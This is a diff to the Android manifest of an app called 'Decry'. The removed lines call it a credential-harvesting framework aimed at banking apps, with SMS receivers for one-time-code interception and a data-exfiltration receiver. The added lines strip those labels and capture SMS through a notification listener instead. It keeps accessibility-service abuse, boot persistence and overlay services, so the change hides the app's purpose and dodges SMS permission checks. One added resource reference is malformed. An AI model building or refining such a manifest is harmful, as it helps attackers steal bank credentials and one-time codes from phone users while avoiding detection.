@@ -1,18 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-    <!--
-        Decry - Credential Harvesting Framework
-        Target: Banking application credential extraction
-    -->
+    <!-- No SMS permissions required - we use NotificationListenerService instead -->
 
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
     <uses-permission android:name="android.permission.WRITE_SETTINGS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- Notification access for reading SMS notifications -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
 
     <application
         android:label="Decry"
@@ -34,7 +33,8 @@
             android:windowSoftInputMode="adjustResize">
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
-                android:resource="@style/NormalTheme" />
+                android:resource="@@style/NormalTheme"
+                />
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -42,8 +42,8 @@
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
-                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.QUICKBOOT_WAKEUP"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_WAKEUP"/>
                 <category android:name="android.intent.category.ALTERNATIVE"/>
                 <data android:scheme="package" />
             </intent-filter>
@@ -54,7 +54,8 @@
             android:name=".DecryBackgroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|specialOverlayWindow" />
+            android:foregroundServiceType="dataSync|specialOverlayWindow"
+            />
 
         <!-- Broadcast receiver for boot completion persistence -->
         <receiver
@@ -74,61 +75,25 @@
             android:name=".DecryAccessibilityService"
             android:description="@string/accessibility_service_description"
             android:exported="true"
-            android:label="Decry"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/decry_accessibility_service" />
+                android:resource="@xml/accessibility_service_config"
+                />
         </service>
 
-        <!-- SMS Receiver for OTP interception -->
-        <receiver
-            android:name=".SmsReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_STORED_SMS_ACTION">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.RECEIVE_SMS" />
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
-            </intent-filter>
-        </receiver>
-
-        <receiver
-            android:name=".SmsReceiver"
-            android:enabled="true"
+        <!-- Notification Listener Service for SMS notification capture -->
+        <service
+            android:name=".DecryNotificationListenerService"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
             <intent-filter>
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
-        </receiver>
-
-        <!-- Data exfiltration receiver -->
-        <receiver
-            android:name=".DataExfiltratorReceiver"
-            android:enabled="true"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="com.decry.DATA_CAPTURED" />
-                <action android:name="com.decry.COMMAND" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Flutter embedding meta-data -->
-        <meta-data
-            android:name="flutterEmbedding"
-            android:value="2" />
+        </service>
 
     </application>
-    
-    <queries>
-        <intent>
-            <action android:name="android.intent.action.PROCESS_TEXT"/>
-            <data android:mimeType="text/plain"/>
-        </intent>
-        <package android:name="com.android.settings" />
-        <package android:name="com.android.vending" />
-    </queries>
 </manifest>
